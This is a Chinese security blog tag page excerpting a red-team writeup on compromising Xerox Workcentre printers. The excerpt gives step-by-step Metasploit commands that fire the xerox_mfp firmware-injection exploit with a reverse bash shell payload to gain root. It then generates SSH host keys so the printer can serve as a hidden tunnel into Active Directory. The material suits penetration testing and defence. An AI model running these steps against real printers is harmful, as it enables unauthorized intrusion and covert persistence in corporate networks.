<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Tag: LDAP | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="home-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      
<main class="content" role="main">
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-01-11T18:28:55.000Z" itemprop="datePublished">
          2016-01-12
      </time>
    
    
    | 
    <a href='/tag/APT/'>APT</a>,
    
    <a href='/tag/Metasploit/'>Metasploit</a>,
    
    <a href='/tag/MFP/'>MFP</a>,
    
    <a href='/tag/LDAP/'>LDAP</a>
    
    
</span>
      <h2 class="post-title"><a href="/1133.seo/">针对打印机的APT攻击</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p><b>一直以来我们都在讨论多功能打印机（MFP）在企业环境下所带来的风险，以及攻击者如何轻易的利用其来进行恶意攻击，比如通过<a href="http://ha.cker.in/tag/LDAP" target="_blank">LDAP</a>提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能。</b></p>  <p>而在最近一次我们的攻防演练中，在通过MFP设备攻击Windows Active Directory时，我们利用该设备隐藏了我们的位置，这使得针对MFP设备的攻击进入了新的阶段。在本文中我们就来分享一下如何利用被盗用的Xerox Workcentre MFP设备来进行<a href="http://ha.cker.in/tag/APT" target="_blank">APT</a>的细节。</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image001.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/APT_8EB4/clip_image001_thumb.png" width="787" height="398" /></a></p>  <p>首先我们要确定该Xerox Workcentre MFP设备在已经被入侵的网络中很容易受到固件注入攻击。实际上该技术早在2012年就已经被发表了，但由于缺乏对这一类物联网设备的强制性更新，目前仍有大量的Xerox Workcentre <a href="http://ha.cker.in/tag/MFP" target="_blank">MFP</a>设备会受到这种攻击，这一点可以很容易的通过<a href="http://ha.cker.in/tag/metasploit" target="_blank">Metasploit</a>中的xerox_mfp模块来进行验证。而如果设备并不容易遭受攻击，或者攻击的结果只能够进行打印等操作，那显然是毫无价值的。但是如果它存在严重漏洞可以使你获得反向shell并最终拿到该设备的Root权限，那就相当的有价值了。</p>  <p><b>以下将向您展示通过<a href="http://ha.cker.in/tag/metasploit" target="_blank">Metasploit</a>中的xerox_mfp模块来实施此类攻击。</b></p>  <p>[1]在Metasploit中选择 xerox_mfp 模块：</p>  <p>Use exploit/unix/misc/xerox_mfp</p>  <p>（<a href="http://www.rapid7.com/db/modules/exploit/unix/misc/xerox_mfp）">http://www.rapid7.com/db/modules/exploit/unix/misc/xerox_mfp）</a></p>  <p>[2]接下来选择反向 bash payload 模块并使用它：</p>  <p>Set payload cmd/unix/reverse_bash</p>  <p>[3]最后使用以下命令设置目标IP和本地IP:</p>  <p>set RHOST ipaddress</p>  <p>set LHOST ipaddress</p>  <p>[4]这里建议你设置 wfsdelay 到30，因为当你在进行攻击时打印机有可能进入睡眠模式，这样做可以在你等待会话连接到监听器时增加延时。</p>  <p>set wfsdelay 30</p>  <p>[5]一旦完成上面的操作，你就可以通过输入或者运行exploit来启动exploit。</p>  <p>Xerox exploit将会启动固件注入攻击并返回一个可以接入MFP root权限的远程shell。</p>  <p>如下图所示：</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image002.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/APT_8EB4/clip_image002_thumb.png" width="699" height="635" /></a></p>  <p><b>建立并启用SSHD</b></p>  <p>当你获得了该MFP设备的root访问权限后，需要进行一些必要的配置，以便能够启用SSH隧道。第一步是建立SSH主机密钥，使你可以启动MFP设备上的SSH进程。</p>  <p><b>具体步骤如下：</b></p>  <p>输入以下命令来生成dsa和rsa密钥对：</p>  <p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>  <p>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</p>  <p>当有提示要输入密码时直接回车，下图是生成密钥的一个例子：</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image003.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/APT_8EB4/clip_image003_thumb.png" width="736" height="372" /></a></p>  <p></p><br>
      
      </p>
      
      <p>
          <a href="/1133.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <nav class="pagination" role="pagination">
    
    <span class="page-number">Page 1 of 1</span>
    
  </nav>
</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
